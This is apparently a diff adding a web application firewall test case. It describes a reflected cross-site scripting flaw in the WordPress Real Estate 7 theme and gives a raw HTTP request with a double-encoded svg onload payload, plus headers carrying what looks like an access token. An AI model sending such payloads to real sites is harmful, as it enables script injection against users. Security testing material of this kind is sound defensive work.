@@ -1,0 +1,9 @@
+# 利用【WordPress Real Estate 7 Theme 未经身份验证的反射跨站点脚本】-80000228
+# WordPress的Real Estate 7 premium主题在v3.3.4以下的版本中，通过'ct_additional_features'选项，容易受到反射式跨站脚本（XSS）攻击。该漏洞允许未经认证的攻击者在搜索页面中注入恶意的JavaScript有效载荷，如果他们能够欺骗用户执行一个动作，如点击一个链接，就可以执行。
+GET /?ct_mobile_keyword&ct_keyword=Z&ct_zipcode&search-listings=true&ct_additional_features%5B0%5D=central-forced-air&acid=80000228&id=%253Csvg%252Fonload%253Dalert%2528%2560FearZzZz%2560%2529%253E&bid=hd_tag_m8mv26ny HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26ny
+RM-PRO-Token: 9ac12de977d9c18289960482687b4bfe
+RM-PRO-Time: 1742808642807
+User-Agent: curl/7.83.1
+
